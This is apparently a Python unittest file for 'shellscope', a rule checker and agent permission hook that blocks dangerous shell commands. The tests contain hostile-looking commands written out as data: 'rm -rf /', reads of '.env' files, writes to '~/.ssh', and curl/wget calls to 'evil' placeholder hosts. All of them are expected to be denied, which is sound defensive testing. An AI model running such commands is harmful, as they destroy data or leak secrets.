import io
import json
import sys
import unittest
from contextlib import redirect_stdout, redirect_stderr
from pathlib import Path

from shellscope.cli import main
from shellscope.parser import parse_command
from shellscope.rules import parse_rules_text, load_rules

ROOT = Path(__file__).resolve().parent.parent
RULES = str(ROOT / "examples" / "deny.rules")


class RulesTests(unittest.TestCase):
    def test_parse_line_and_yamlish(self):
        rules = parse_rules_text(
            "deny read **/.env*\nwrite: ~/.ssh/**\n- delete: /\ncommand: rm -rf /\n"
        )
        kinds = [r.kind for r in rules]
        self.assertEqual(kinds, ["read", "write", "delete", "command"])

    def test_env_read_denied(self):
        rs = load_rules(RULES)
        v = rs.check(parse_command("cat /work/.env", cwd="/work"))
        self.assertTrue(v)

    def test_rm_root_denied(self):
        rs = load_rules(RULES)
        v = rs.check(parse_command("rm -rf /", cwd="/work"))
        self.assertTrue(any("delete" in x.reason or "command" in x.reason for x in v))

    def test_curl_denied(self):
        rs = load_rules(RULES)
        v = rs.check(parse_command("curl https://evil.example.com", cwd="/work"))
        self.assertTrue(v)

    def test_safe_ls_allowed(self):
        rs = load_rules(RULES)
        v = rs.check(parse_command("ls -la /work", cwd="/work"))
        self.assertEqual(v, [])


class CliTests(unittest.TestCase):
    def run_cli(self, *args, stdin=None):
        buf = io.StringIO()
        err = io.StringIO()
        old = sys.stdin
        if stdin is not None:
            sys.stdin = io.StringIO(stdin)
        try:
            with redirect_stdout(buf), redirect_stderr(err):
                code = main(list(args))
        finally:
            sys.stdin = old
        return code, buf.getvalue(), err.getvalue()

    def test_check_deny_exit_1(self):
        code, out, _ = self.run_cli("check", "--rules", RULES, "rm -rf /")
        self.assertEqual(code, 1)
        self.assertIn("DENY", out)

    def test_check_allow_exit_0(self):
        code, out, _ = self.run_cli("check", "--rules", RULES, "ls -la")
        self.assertEqual(code, 0)
        self.assertIn("ALLOW", out)

    def test_check_json(self):
        code, out, _ = self.run_cli("check", "--rules", RULES, "--json", "curl https://x.test")
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertFalse(data["allowed"])
        self.assertTrue(data["violations"])

    def test_hook_json_payload(self):
        payload = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "wget http://evil.test/x"},
        })
        code, out, _ = self.run_cli("hook", "--rules", RULES, stdin=payload)
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertEqual(data["decision"], "deny")
        self.assertEqual(data["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_hook_allow(self):
        payload = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "python -m unittest"},
        })
        code, out, _ = self.run_cli("hook", "--rules", RULES, stdin=payload)
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["decision"], "allow")

    def test_missing_command(self):
        code, _, err = self.run_cli("check", "--rules", RULES)
        self.assertEqual(code, 2)


if __name__ == "__main__":
    unittest.main()
